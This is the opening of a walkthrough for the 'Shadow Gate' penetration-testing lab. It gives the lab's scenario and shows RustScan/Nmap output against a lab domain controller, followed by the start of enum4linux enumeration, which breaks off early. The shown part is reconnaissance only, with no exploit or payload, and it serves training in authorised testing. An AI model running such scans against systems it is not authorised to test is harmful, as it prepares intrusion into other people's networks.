# Shadow Gate (Easy)

#### Author <a href="#user-content-author" id="user-content-author"></a>

* Ross

**ShadowGate** recently completed a corporate acquisition that significantly expanded its internal network, user base, and application footprint. Several business-critical systems were migrated and consolidated under tight operational deadlines to minimize downtime and maintain service continuity.

While functional validation was completed, the organization deferred a comprehensive security assessment due to delivery pressure and staffing constraints. Leadership has since requested an independent penetration test to validate the security posture of the newly created environment and identify any material risk before the next audit cycle.

The assessment will evaluate whether a motivated attacker with standard network access could compromise sensitive systems, escalate privileges, or move laterally within the enterprise environment.

The Hack Smarter team has been authorized to perform a black box internal penetration test against the ShadowGate environment.

IIS is avaliabe:

![image.png](attachment:ec8395da-6be8-443a-a78c-1c556448461d:image.png)

ENUMERATION

RustScan:

I am going to use rust scan instead of Nmap, as it is more of a modern scanner and it is a bit faster.

```jsx

┌──(root㉿kali)-[~/Desktop/Hack Smarter Labs/Shadow]
└─# rustscan -b 500 -a  10.1.76.207 -- -sC -sV -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \\ |  `| |
| .-. \\| {_} |.-._} } | |  .-._} }\\     }/  /\\  \\| |\\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: <http://discord.skerritt.blog>         :
: <https://github.com/RustScan/RustScan> :
 --------------------------------------
RustScan: Exploring the digital landscape, one IP at a time.

[~] The config file is expected to be at "/root/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 924'.
Open 10.1.76.207:53
Open 10.1.76.207:88
Open 10.1.76.207:80
Open 10.1.76.207:135
Open 10.1.76.207:139
Open 10.1.76.207:389
Open 10.1.76.207:464
Open 10.1.76.207:445
Open 10.1.76.207:593
Open 10.1.76.207:636
Open 10.1.76.207:3268
Open 10.1.76.207:3269
Open 10.1.76.207:5985
Open 10.1.76.207:9389
Open 10.1.76.207:49664
Open 10.1.76.207:49669
Open 10.1.76.207:49667
Open 10.1.76.207:63928
Open 10.1.76.207:63929
Open 10.1.76.207:63941
Open 10.1.76.207:63955
Open 10.1.76.207:63987
Open 10.1.76.207:63975
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sC -sV -Pn" on ip 10.1.76.207
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.99 ( <https://nmap.org> ) at 2026-05-07 11:03 -0400
NSE: Loaded 158 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:03
Completed NSE at 11:03, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:03
Completed NSE at 11:03, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:03
Completed NSE at 11:03, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 11:03
Completed Parallel DNS resolution of 1 host. at 11:03, 0.50s elapsed
DNS resolution of 1 IPs took 0.50s. Mode: Async [#: 4, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 11:03
Scanning 10.1.76.207 [23 ports]
Discovered open port 139/tcp on 10.1.76.207
Discovered open port 53/tcp on 10.1.76.207
Discovered open port 80/tcp on 10.1.76.207
Discovered open port 49664/tcp on 10.1.76.207
Discovered open port 135/tcp on 10.1.76.207
Discovered open port 3269/tcp on 10.1.76.207
Discovered open port 445/tcp on 10.1.76.207
Discovered open port 593/tcp on 10.1.76.207
Discovered open port 389/tcp on 10.1.76.207
Discovered open port 63941/tcp on 10.1.76.207
Discovered open port 63975/tcp on 10.1.76.207
Discovered open port 5985/tcp on 10.1.76.207
Discovered open port 464/tcp on 10.1.76.207
Discovered open port 88/tcp on 10.1.76.207
Discovered open port 49667/tcp on 10.1.76.207
Discovered open port 63929/tcp on 10.1.76.207
Discovered open port 9389/tcp on 10.1.76.207
Discovered open port 63928/tcp on 10.1.76.207
Discovered open port 636/tcp on 10.1.76.207
Discovered open port 3268/tcp on 10.1.76.207
Discovered open port 49669/tcp on 10.1.76.207
Discovered open port 63987/tcp on 10.1.76.207
Discovered open port 63955/tcp on 10.1.76.207
Completed SYN Stealth Scan at 11:03, 0.12s elapsed (23 total ports)
Initiating Service scan at 11:03
Scanning 23 services on 10.1.76.207
Completed Service scan at 11:04, 60.70s elapsed (23 services on 1 host)
NSE: Script scanning 10.1.76.207.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:04
Stats: 0:01:04 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE: Active NSE Script Threads: 53 (51 waiting)
NSE Timing: About 98.36% done; ETC: 11:04 (0:00:00 remaining)
Stats: 0:01:04 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE: Active NSE Script Threads: 52 (52 waiting)
NSE Timing: About 98.39% done; ETC: 11:04 (0:00:00 remaining)
NSE Timing: About 99.97% done; ETC: 11:04 (0:00:00 remaining)
Completed NSE at 11:05, 40.27s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:05
Completed NSE at 11:05, 1.94s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:05
Completed NSE at 11:05, 0.01s elapsed
Nmap scan report for 10.1.76.207
Host is up, received user-set (0.048s latency).
Scanned at 2026-05-07 11:03:20 EDT for 103s

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 126 Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2026-05-07 15:03:24Z)
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: shadow.gate, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.shadow.gate
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.shadow.gate
| Issuer: commonName=shadow-DC01-CA/domainComponent=shadow
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-01-15T01:10:24
| Not valid after:  2027-01-15T01:10:24
| MD5:     5d22 4c5c 3d19 1ae9 d19a 2cf8 345d 14f6
| SHA-1:   2db8 b2b4 3549 bb0d 519f 1e00 845d 0531 b9fe 3390
| SHA-256: e948 65d7 b039 fa26 3f30 bc23 e7b0 f0b7 6a9d 53a8 4c51 06cf 019e 3d37 353b 2e90
| -----BEGIN CERTIFICATE-----
| MIIGLDCCBRSgAwIBAgITIAAAAALNftOUa+rjsQAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBHMRQwEgYKCZImiZPyLGQBGRYEZ2F0ZTEWMBQGCgmSJomT8ixkARkWBnNoYWRv
| dzEXMBUGA1UEAxMOc2hhZG93LURDMDEtQ0EwHhcNMjYwMTE1MDExMDI0WhcNMjcw
| MTE1MDExMDI0WjAbMRkwFwYDVQQDExBEQzAxLnNoYWRvdy5nYXRlMIIBIjANBgkq
| hkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA13B8CclDqxx150amu6yGexpuN84itlRx
| OLPOipgyge8eTpq0Arf6q5xcT+Z7Uu88MlA3bqO/ItojOdqsIzNu5/fMua/XehGf
| 5rQt+8mBMB2xXvAHsWL7VqNn/um5l3E/Y2Pr+Jymz2WuTG9vX6Rl+A3YVHKtah66
| HYFehKPTYqkPNf2X3Vibqpt5cevDVyRwx2/0UOur/Ei3bKWWpQoj+daS4+iOJw2m
| wWWuX8BqVpDmabSkGtVW512yf/MjImn7B+k3jLsy+7VzOIcZUTONoGDisej8K6/M
| OL/gNpYog3vzChxkrQKmYKmhfg2C6bzrdtwN2jYJNePm7D0WAqHi5QIDAQABo4ID
| OzCCAzcwLwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBs
| AGwAZQByMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8E
| BAMCBaAweAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcN
| AwQCAgCAMAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsG
| CWCGSAFlAwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNVHQ4EFgQUDWth45jC
| PdpV2HnIB82YlBRUlHkwHwYDVR0jBBgwFoAUpde9tYfagDbkVkZnCfG8ZyT26kQw
| gckGA1UdHwSBwTCBvjCBu6CBuKCBtYaBsmxkYXA6Ly8vQ049c2hhZG93LURDMDEt
| Q0EsQ049REMwMSxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049
| U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1zaGFkb3csREM9Z2F0ZT9jZXJ0
| aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJp
| YnV0aW9uUG9pbnQwgcAGCCsGAQUFBwEBBIGzMIGwMIGtBggrBgEFBQcwAoaBoGxk
| YXA6Ly8vQ049c2hhZG93LURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUy
| MFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2hhZG93
| LERDPWdhdGU/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmlj
| YXRpb25BdXRob3JpdHkwPAYDVR0RBDUwM6AfBgkrBgEEAYI3GQGgEgQQBnKp+R8U
| /UyxrdaFzkq7O4IQREMwMS5zaGFkb3cuZ2F0ZTBOBgkrBgEEAYI3GQIEQTA/oD0G
| CisGAQQBgjcZAgGgLwQtUy0xLTUtMjEtMjQzNDkzOTMwLTExMTM0NjQ3MDUtMzAx
| Mjc3MTU4Ni0xMDAwMA0GCSqGSIb3DQEBCwUAA4IBAQClHfokg9kQzxNj3VWsJ93S
| xr8m8cBGoug6iph+zatwNAYpw63dEMH5QzVs1ZSHLMu8MNiTIJzKQubKeiSRcUND
| Fgrk70B88l8fTLXn+sN2GCmZyokpe7jxPoQNiXuL/3hRMRHSey2eXGUSVy19+beo
| D1zh4yBxMukClNMXtf7mb0c8hCEW9kV7kwi36Kz+e1kwypfq9K7ftue8efTajlrC
| Ar/4RnwhpdeFPSfbwmxxefBEO5fchjx1TyabLkPhe337OzfHAqDfkwtDIIWR/mw4
| yVMj4J+ZfDZbkDXRP2fanJGo9LkuVnlACnH8qgrnyZh/bHrTPX7TbDjHYG8LMyI6
|_-----END CERTIFICATE-----
445/tcp   open  microsoft-ds? syn-ack ttl 126
464/tcp   open  kpasswd5?     syn-ack ttl 126
593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: shadow.gate, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.shadow.gate
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.shadow.gate
| Issuer: commonName=shadow-DC01-CA/domainComponent=shadow
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-01-15T01:10:24
| Not valid after:  2027-01-15T01:10:24
| MD5:     5d22 4c5c 3d19 1ae9 d19a 2cf8 345d 14f6
| SHA-1:   2db8 b2b4 3549 bb0d 519f 1e00 845d 0531 b9fe 3390
| SHA-256: e948 65d7 b039 fa26 3f30 bc23 e7b0 f0b7 6a9d 53a8 4c51 06cf 019e 3d37 353b 2e90
| -----BEGIN CERTIFICATE-----
| MIIGLDCCBRSgAwIBAgITIAAAAALNftOUa+rjsQAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBHMRQwEgYKCZImiZPyLGQBGRYEZ2F0ZTEWMBQGCgmSJomT8ixkARkWBnNoYWRv
| dzEXMBUGA1UEAxMOc2hhZG93LURDMDEtQ0EwHhcNMjYwMTE1MDExMDI0WhcNMjcw
| MTE1MDExMDI0WjAbMRkwFwYDVQQDExBEQzAxLnNoYWRvdy5nYXRlMIIBIjANBgkq
| hkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA13B8CclDqxx150amu6yGexpuN84itlRx
| OLPOipgyge8eTpq0Arf6q5xcT+Z7Uu88MlA3bqO/ItojOdqsIzNu5/fMua/XehGf
| 5rQt+8mBMB2xXvAHsWL7VqNn/um5l3E/Y2Pr+Jymz2WuTG9vX6Rl+A3YVHKtah66
| HYFehKPTYqkPNf2X3Vibqpt5cevDVyRwx2/0UOur/Ei3bKWWpQoj+daS4+iOJw2m
| wWWuX8BqVpDmabSkGtVW512yf/MjImn7B+k3jLsy+7VzOIcZUTONoGDisej8K6/M
| OL/gNpYog3vzChxkrQKmYKmhfg2C6bzrdtwN2jYJNePm7D0WAqHi5QIDAQABo4ID
| OzCCAzcwLwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBs
| AGwAZQByMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8E
| BAMCBaAweAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcN
| AwQCAgCAMAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsG
| CWCGSAFlAwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNVHQ4EFgQUDWth45jC
| PdpV2HnIB82YlBRUlHkwHwYDVR0jBBgwFoAUpde9tYfagDbkVkZnCfG8ZyT26kQw
| gckGA1UdHwSBwTCBvjCBu6CBuKCBtYaBsmxkYXA6Ly8vQ049c2hhZG93LURDMDEt
| Q0EsQ049REMwMSxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049
| U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1zaGFkb3csREM9Z2F0ZT9jZXJ0
| aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJp
| YnV0aW9uUG9pbnQwgcAGCCsGAQUFBwEBBIGzMIGwMIGtBggrBgEFBQcwAoaBoGxk
| YXA6Ly8vQ049c2hhZG93LURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUy
| MFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2hhZG93
| LERDPWdhdGU/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmlj
| YXRpb25BdXRob3JpdHkwPAYDVR0RBDUwM6AfBgkrBgEEAYI3GQGgEgQQBnKp+R8U
| /UyxrdaFzkq7O4IQREMwMS5zaGFkb3cuZ2F0ZTBOBgkrBgEEAYI3GQIEQTA/oD0G
| CisGAQQBgjcZAgGgLwQtUy0xLTUtMjEtMjQzNDkzOTMwLTExMTM0NjQ3MDUtMzAx
| Mjc3MTU4Ni0xMDAwMA0GCSqGSIb3DQEBCwUAA4IBAQClHfokg9kQzxNj3VWsJ93S
| xr8m8cBGoug6iph+zatwNAYpw63dEMH5QzVs1ZSHLMu8MNiTIJzKQubKeiSRcUND
| Fgrk70B88l8fTLXn+sN2GCmZyokpe7jxPoQNiXuL/3hRMRHSey2eXGUSVy19+beo
| D1zh4yBxMukClNMXtf7mb0c8hCEW9kV7kwi36Kz+e1kwypfq9K7ftue8efTajlrC
| Ar/4RnwhpdeFPSfbwmxxefBEO5fchjx1TyabLkPhe337OzfHAqDfkwtDIIWR/mw4
| yVMj4J+ZfDZbkDXRP2fanJGo9LkuVnlACnH8qgrnyZh/bHrTPX7TbDjHYG8LMyI6
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
3268/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: shadow.gate, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.shadow.gate
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.shadow.gate
| Issuer: commonName=shadow-DC01-CA/domainComponent=shadow
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-01-15T01:10:24
| Not valid after:  2027-01-15T01:10:24
| MD5:     5d22 4c5c 3d19 1ae9 d19a 2cf8 345d 14f6
| SHA-1:   2db8 b2b4 3549 bb0d 519f 1e00 845d 0531 b9fe 3390
| SHA-256: e948 65d7 b039 fa26 3f30 bc23 e7b0 f0b7 6a9d 53a8 4c51 06cf 019e 3d37 353b 2e90
| -----BEGIN CERTIFICATE-----
| MIIGLDCCBRSgAwIBAgITIAAAAALNftOUa+rjsQAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBHMRQwEgYKCZImiZPyLGQBGRYEZ2F0ZTEWMBQGCgmSJomT8ixkARkWBnNoYWRv
| dzEXMBUGA1UEAxMOc2hhZG93LURDMDEtQ0EwHhcNMjYwMTE1MDExMDI0WhcNMjcw
| MTE1MDExMDI0WjAbMRkwFwYDVQQDExBEQzAxLnNoYWRvdy5nYXRlMIIBIjANBgkq
| hkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA13B8CclDqxx150amu6yGexpuN84itlRx
| OLPOipgyge8eTpq0Arf6q5xcT+Z7Uu88MlA3bqO/ItojOdqsIzNu5/fMua/XehGf
| 5rQt+8mBMB2xXvAHsWL7VqNn/um5l3E/Y2Pr+Jymz2WuTG9vX6Rl+A3YVHKtah66
| HYFehKPTYqkPNf2X3Vibqpt5cevDVyRwx2/0UOur/Ei3bKWWpQoj+daS4+iOJw2m
| wWWuX8BqVpDmabSkGtVW512yf/MjImn7B+k3jLsy+7VzOIcZUTONoGDisej8K6/M
| OL/gNpYog3vzChxkrQKmYKmhfg2C6bzrdtwN2jYJNePm7D0WAqHi5QIDAQABo4ID
| OzCCAzcwLwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBs
| AGwAZQByMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8E
| BAMCBaAweAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcN
| AwQCAgCAMAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsG
| CWCGSAFlAwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNVHQ4EFgQUDWth45jC
| PdpV2HnIB82YlBRUlHkwHwYDVR0jBBgwFoAUpde9tYfagDbkVkZnCfG8ZyT26kQw
| gckGA1UdHwSBwTCBvjCBu6CBuKCBtYaBsmxkYXA6Ly8vQ049c2hhZG93LURDMDEt
| Q0EsQ049REMwMSxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049
| U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1zaGFkb3csREM9Z2F0ZT9jZXJ0
| aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJp
| YnV0aW9uUG9pbnQwgcAGCCsGAQUFBwEBBIGzMIGwMIGtBggrBgEFBQcwAoaBoGxk
| YXA6Ly8vQ049c2hhZG93LURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUy
| MFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2hhZG93
| LERDPWdhdGU/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmlj
| YXRpb25BdXRob3JpdHkwPAYDVR0RBDUwM6AfBgkrBgEEAYI3GQGgEgQQBnKp+R8U
| /UyxrdaFzkq7O4IQREMwMS5zaGFkb3cuZ2F0ZTBOBgkrBgEEAYI3GQIEQTA/oD0G
| CisGAQQBgjcZAgGgLwQtUy0xLTUtMjEtMjQzNDkzOTMwLTExMTM0NjQ3MDUtMzAx
| Mjc3MTU4Ni0xMDAwMA0GCSqGSIb3DQEBCwUAA4IBAQClHfokg9kQzxNj3VWsJ93S
| xr8m8cBGoug6iph+zatwNAYpw63dEMH5QzVs1ZSHLMu8MNiTIJzKQubKeiSRcUND
| Fgrk70B88l8fTLXn+sN2GCmZyokpe7jxPoQNiXuL/3hRMRHSey2eXGUSVy19+beo
| D1zh4yBxMukClNMXtf7mb0c8hCEW9kV7kwi36Kz+e1kwypfq9K7ftue8efTajlrC
| Ar/4RnwhpdeFPSfbwmxxefBEO5fchjx1TyabLkPhe337OzfHAqDfkwtDIIWR/mw4
| yVMj4J+ZfDZbkDXRP2fanJGo9LkuVnlACnH8qgrnyZh/bHrTPX7TbDjHYG8LMyI6
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: shadow.gate, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.shadow.gate
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.shadow.gate
| Issuer: commonName=shadow-DC01-CA/domainComponent=shadow
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-01-15T01:10:24
| Not valid after:  2027-01-15T01:10:24
| MD5:     5d22 4c5c 3d19 1ae9 d19a 2cf8 345d 14f6
| SHA-1:   2db8 b2b4 3549 bb0d 519f 1e00 845d 0531 b9fe 3390
| SHA-256: e948 65d7 b039 fa26 3f30 bc23 e7b0 f0b7 6a9d 53a8 4c51 06cf 019e 3d37 353b 2e90
| -----BEGIN CERTIFICATE-----
| MIIGLDCCBRSgAwIBAgITIAAAAALNftOUa+rjsQAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBHMRQwEgYKCZImiZPyLGQBGRYEZ2F0ZTEWMBQGCgmSJomT8ixkARkWBnNoYWRv
| dzEXMBUGA1UEAxMOc2hhZG93LURDMDEtQ0EwHhcNMjYwMTE1MDExMDI0WhcNMjcw
| MTE1MDExMDI0WjAbMRkwFwYDVQQDExBEQzAxLnNoYWRvdy5nYXRlMIIBIjANBgkq
| hkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA13B8CclDqxx150amu6yGexpuN84itlRx
| OLPOipgyge8eTpq0Arf6q5xcT+Z7Uu88MlA3bqO/ItojOdqsIzNu5/fMua/XehGf
| 5rQt+8mBMB2xXvAHsWL7VqNn/um5l3E/Y2Pr+Jymz2WuTG9vX6Rl+A3YVHKtah66
| HYFehKPTYqkPNf2X3Vibqpt5cevDVyRwx2/0UOur/Ei3bKWWpQoj+daS4+iOJw2m
| wWWuX8BqVpDmabSkGtVW512yf/MjImn7B+k3jLsy+7VzOIcZUTONoGDisej8K6/M
| OL/gNpYog3vzChxkrQKmYKmhfg2C6bzrdtwN2jYJNePm7D0WAqHi5QIDAQABo4ID
| OzCCAzcwLwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBs
| AGwAZQByMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8E
| BAMCBaAweAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcN
| AwQCAgCAMAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsG
| CWCGSAFlAwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNVHQ4EFgQUDWth45jC
| PdpV2HnIB82YlBRUlHkwHwYDVR0jBBgwFoAUpde9tYfagDbkVkZnCfG8ZyT26kQw
| gckGA1UdHwSBwTCBvjCBu6CBuKCBtYaBsmxkYXA6Ly8vQ049c2hhZG93LURDMDEt
| Q0EsQ049REMwMSxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049
| U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1zaGFkb3csREM9Z2F0ZT9jZXJ0
| aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJp
| YnV0aW9uUG9pbnQwgcAGCCsGAQUFBwEBBIGzMIGwMIGtBggrBgEFBQcwAoaBoGxk
| YXA6Ly8vQ049c2hhZG93LURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUy
| MFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9c2hhZG93
| LERDPWdhdGU/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmlj
| YXRpb25BdXRob3JpdHkwPAYDVR0RBDUwM6AfBgkrBgEEAYI3GQGgEgQQBnKp+R8U
| /UyxrdaFzkq7O4IQREMwMS5zaGFkb3cuZ2F0ZTBOBgkrBgEEAYI3GQIEQTA/oD0G
| CisGAQQBgjcZAgGgLwQtUy0xLTUtMjEtMjQzNDkzOTMwLTExMTM0NjQ3MDUtMzAx
| Mjc3MTU4Ni0xMDAwMA0GCSqGSIb3DQEBCwUAA4IBAQClHfokg9kQzxNj3VWsJ93S
| xr8m8cBGoug6iph+zatwNAYpw63dEMH5QzVs1ZSHLMu8MNiTIJzKQubKeiSRcUND
| Fgrk70B88l8fTLXn+sN2GCmZyokpe7jxPoQNiXuL/3hRMRHSey2eXGUSVy19+beo
| D1zh4yBxMukClNMXtf7mb0c8hCEW9kV7kwi36Kz+e1kwypfq9K7ftue8efTajlrC
| Ar/4RnwhpdeFPSfbwmxxefBEO5fchjx1TyabLkPhe337OzfHAqDfkwtDIIWR/mw4
| yVMj4J+ZfDZbkDXRP2fanJGo9LkuVnlACnH8qgrnyZh/bHrTPX7TbDjHYG8LMyI6
|_-----END CERTIFICATE-----
5985/tcp  open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 126 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
63928/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
63929/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
63941/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
63955/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
63975/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
63987/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 62106/tcp): CLEAN (Timeout)
|   Check 2 (port 63335/tcp): CLEAN (Timeout)
|   Check 3 (port 16872/udp): CLEAN (Timeout)
|   Check 4 (port 58994/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_clock-skew: -3s
| smb2-time: 
|   date: 2026-05-07T15:04:23
|_  start_date: N/A

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:05
Completed NSE at 11:05, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:05
Completed NSE at 11:05, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:05
Completed NSE at 11:05, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
Nmap done: 1 IP address (1 host up) scanned in 104.13 seconds
           Raw packets sent: 23 (1.012KB) | Rcvd: 23 (1.012KB)
```

ENUM4Linux, for further enumeration, I had some options, so I tried to use enum4linux here, as you can see it gave me some users.

```jsx
┌──(root㉿kali)-[~/Desktop/Hack Smarter Labs/Shadow]
└─# enum4linux 10.1.76.207
Starting enum4linux v0.9.1 ( <http://labs.portcullis.co.uk/application/enum4linux/> ) on Thu May  7 11:31:30 2026

 =========================================( Target Information )=========================================
                                                                                                                                                                                                                                        
Target ........... 10.1.76.207                                                                                                                                                                                                          
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

 ============================( Enumerating Workgroup/Domain on 10.1.76.207 )============================
                                                                                                                                                                                                                                        
                                                                                                                                                                                                                                        
[E] Can't find workgroup/domain                                                                                                                                                                                                         
                                                                                                                                                                                                                                        
                                                                                                                                                                                                                                        

 ================================( Nbtstat Information for 10.1.76.207 )================================
                                                                                                                                                                                                                                        
Looking up status of 10.1.76.207                                                                                                                                                                                                        
No reply from 10.1.76.207

